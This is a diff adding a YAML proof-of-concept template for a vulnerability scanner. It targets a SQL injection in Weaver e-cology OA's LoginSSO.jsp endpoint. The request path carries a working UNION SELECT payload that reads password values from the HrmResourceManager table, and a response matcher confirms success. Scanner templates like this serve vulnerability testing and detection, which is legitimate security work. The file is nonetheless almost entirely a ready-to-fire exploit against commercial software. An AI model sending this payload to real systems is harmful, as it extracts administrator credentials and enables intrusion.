@@ -1,0 +1,14 @@
+id: poc-yaml-fanwei-oa-ecology-loginsso-sql-injection
+info:
+  name: 泛微OA-ECology-LoginSSO.jsp-SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: e-cology
+requests:
+- method: GET
+  path: /upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager
+  expression: status_code == 200 && !contains(body, "<code>\r\n\r\n</code>") && contains(body,
+    "<BODY>\r\n<pre>\r\n<code>")
+variables: {}
+transport: http
